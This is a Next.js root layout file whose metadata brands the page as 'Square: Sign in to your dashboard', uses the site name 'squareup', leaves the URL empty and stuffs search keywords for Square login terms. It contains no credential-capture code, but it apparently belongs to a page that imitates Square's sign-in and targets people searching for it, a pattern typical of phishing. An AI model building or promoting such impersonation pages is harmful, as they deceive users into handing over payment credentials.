import type { Metadata } from 'next';
import './globals.css';

export const metadata: Metadata = {
  title: 'Square: Sign in to your dashboard',
  description: 'Sign in to your dashboard',
  icons: {
    icon: '/favicon.ico',
  },

    keywords: [
    "square",
    "square login",
    "square payments",
    "square payment",
    "square sign in",
    "square app",
    "square pay",
    "square square",
    "square up",
    "squareup",
    "squareup login",
    "squareup payments",
    "squareup payment", 
  ],

   openGraph: {
    type: 'website',
    url: "",
    siteName: "squareup"
  }
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en">
      <body>{children}</body>
    </html>
  );
}
